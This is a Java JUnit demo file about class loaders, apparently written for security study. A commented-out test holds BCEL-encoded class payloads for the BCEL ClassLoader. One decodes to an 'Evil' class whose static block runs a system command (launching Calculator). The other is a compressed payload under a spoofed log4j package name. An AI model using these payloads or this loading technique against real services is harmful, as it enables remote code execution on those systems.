package classloader.demo;

import org.junit.Test;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

class MyClassLoader extends ClassLoader {
    // 重写 defineClass 方法以加载字节码
    protected Class defineClass(final byte[] b) {
        System.out.println("MyClassLoader defineClass");
        return defineClass(null, b, 0, b.length);
    }
}

public class classLoaderExample {
    @Test
    public void testJavaClassLoader() throws Exception {
        ClassLoader appClassloader = ClassLoader.getSystemClassLoader();

        // 使用 Class.forName 加载并初始化类
        System.out.println("=== Execute Class.forName ===");
        Class cl = Class.forName("javaclass.demo.classWithStaticCode");

        // 使用 ClassLoader.loadClass 加载但不初始化类
        System.out.println("=== Execute ClassLoader.loadClass ===");
        Class cl2 = appClassloader.loadClass("javaclass.demo.classWithStaticCode");
        Constructor<?> constructor = cl2.getDeclaredConstructor();
        constructor.setAccessible(true);
        constructor.newInstance();
    }

    @Test
    public void testMyCL() throws Exception {
        ClassLoader appClassloader = MyClassLoader.getSystemClassLoader();
        Class cl2 = appClassloader.loadClass("javaclass.demo.classWithStaticCode");
        Constructor<?> constructor = cl2.getDeclaredConstructor();
        constructor.setAccessible(true);
        constructor.newInstance();
    }

    @Test
    public void testBcelCL() throws Exception {
        /*
        String classname = "$$BCEL$$$ca$fe$ba$be$A$A$A4$A$k$K$A$H$A$R$K$A$S$A$T$I$A$U$K$A$S$A$V$H$A$W$H$A$X$H$A$Y$B$A$G$3cinit$3e$B$A$D$u$vV$B$A$ECode$B$A$PLineNumberTable$B$A$I$3cclinit$3e$B$A$NStackMapTable$H$A$W$B$A$KSourceFile$B$A$JEvil$$java$M$A$I$A$J$H$A$Z$M$A$g$A$h$B$A$vopen$m$_System$_Applications$_Calculator$$app$_$M$A$i$A$j$B$A$Tjava$_lang$_Exception$B$A$Rfastjsonjndi$_Evil$B$A$Qjava$_lang$_Object$B$A$Rjava$_lang$_Runtime$B$A$KgetRuntime$B$A$V$u$vLjava$_lang$_Runtime$3b$B$A$Eexec$B$A$t$uLjava$_lang$_String$3b$vLjava$_lang$_Process$3b$A$n$A$G$A$H$A$A$A$A$A$C$A$B$A$I$A$J$A$B$A$K$A$A$A$j$A$B$A$B$A$A$A$F$w$b7$A$B$b1$A$A$A$B$A$L$A$A$A$G$A$B$A$A$A$D$A$I$A$M$A$J$A$B$A$K$A$A$AG$A$C$A$B$A$A$A$O$b8$A$C$S$D$b6$A$EW$a7$A$EK$b1$A$B$A$A$A$J$A$M$A$F$A$C$A$L$A$A$A$S$A$E$A$A$A$G$A$J$A$J$A$M$A$H$A$N$A$K$A$N$A$A$A$H$A$CL$H$A$O$A$A$B$A$P$A$A$A$C$A$Q";
        String classname = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A";
        ClassLoader cl = new com.sun.org.apache.bcel.internal.util.ClassLoader();
        Class.forName(classname, true, cl);

        String classname = "org.apache.log4j.spi$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7dSYS$d3P$U$fe$$$5d$92$86$60$a1$VPP$dc$b1$Fi$dd$c0$a5$V$97$K$$$z$88$a4S$a6$e2K$g$ee$d0h$9b$d44e$f9$v$fe$C$9e$81$99$c2$e8$e8$83$8f$fe$u$c7sc$86$b5$e3Cr$ef$d9$be$f3$9d$e5$fe$fe$f3$ed$t$80$bb$uJ$e8b$88$f05$b3$96$W$3f$JA$86$deO$fa$9a$9e$ae$e9$d6j$baXu$b8$be$c2$Qv$fdK$acp$d2$98a$I$Y$f5$T$s$cduLk$95Lr$d6$a8$99$96$e9N$93W$oYb$I$e6$ec$V$ae$80$a1G$c5$Z$u$E$9d$f5$ec$RR$f5$aa$I$n$y$pFn$86$5e3$84$ee$ac$K$J$b2$8c$B$G$c9n$a6$y$bdN$d1$e70$q$e1$fc1$a6$daf$d3$e5u$V$c3$b8$c0$d0$bd$ca$dd$F$c7np$c7$ddd$YM$9cf$96$3c$adR0$82$cb$S$$$j$87$f5l$w$ae$e0$w$c1$bav$c1$5e$e7NNorb$96$e8$A$o$e3$3aU$banZ$CmT$c5M$q$a8$J$86m$b9$bai5$Z$86$8fr$c9UuG$e3_Z$dc2x$s$f9A$c6$Y$VI$bdL$f1$N$$$e3$WCW$da$90$91$a2$B$a5$x$a6$95$ae$e8$cd$aa$8c$db$a4$9e0$U$g$de$7d$J$f7$Y$fa$O$f1$W$5b$96k$d6$b9$8aIL1$u$d4$E_$c3$d0$7f$8c$ac$af$ce$I$94$87$w$k$e11u$9c$92$g$M$89$c4$f2$ff$bbE$7d5x$b3I$b1YLKx$c2$Q$3f4$cel$Y$bc$e1$9a$b6$a5$e2$a9$Yn$b4A$f1$ae$e6$ea$c6$e7$a2$a3$hD$qZ0$z$3e$df$aaW$b8S$d4$x5$$$f6$c6$a6a$97t$c7$U$b2$af$MR$h$a8$5d$f1$Od$Y$98$u$a8$d0$n$x$d9z$bcdsz$c3$D$92$90S$Q$40$P$B$baU$93$A$bb$L$H$bb$$$b6$b3$e9$ea$8eh$92hP$87$b2K$ox$5e$c5$3bQK$c8s$a6$85m95r$a01$3b$oP$d1$ec$96c$f0YS$d0$f6$5eRJ$A$d1$c6$90$H$3d$b2$$$ub$ab$e9$a6$88M$a63H$ff$I$c4$h$e8$s$e9$X$c9$8c$ce$8f$df$c1$ca$7bPw$R$8d$f5$ed$o$k$eb$df$c7$60$h$Xc$d7$da$b8$f1$VC$e1$l$Y$v$HbI$ad$i$8c$8dk$e5$d0$O$e2$da$W$G$7d$f5$84P$a7$7du$7e$lw$c6$dax$b0$b4$F9O$97$cc6e$88BC$89f$W$c03$ca6B$5c$E$T$c1$zJ$7c$f2$c4H$pi$898$z$a3$H$cf$c9$3a$40$dc$f3d$7b$81$iIK$e4$fd$S3t$9b$a5OEpJ$93$f0$w$_$n$x$f8$9f9$a8$tM$a7$a8$t4$b6$87$d7$db$5e$DD$c2$b0$a7$Mx$c0$ea$3f$H$bc$c1$5b$3a$p$94$a4$e0$HO$fa$c1$d2$O$a2m$cc$j$86$xt$82$98$86$d1$7b$EB$c2$82$d7Q$86$f7$H$f9$c7$3d$99$be$93$b9cG$C$99$9f$9ba$d1$f3$d2$fe$C$lr$VY$S$F$A$A";
        ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();
        Class.forName(classname, true, cls);
         */
    }

    public static void main(String[] args) {
        ClassLoader appClassloader = ClassLoader.getSystemClassLoader();
        ClassLoader extensionClassloader = appClassloader.getParent();

        // 打印类加载器的层级关系
        System.out.println("AppClassLoader is " + appClassloader);
        System.out.println("The parent of AppClassLoader is " + extensionClassloader);
        System.out.println("The parent of ExtensionClassLoader is " + extensionClassloader.getParent());
    }
}

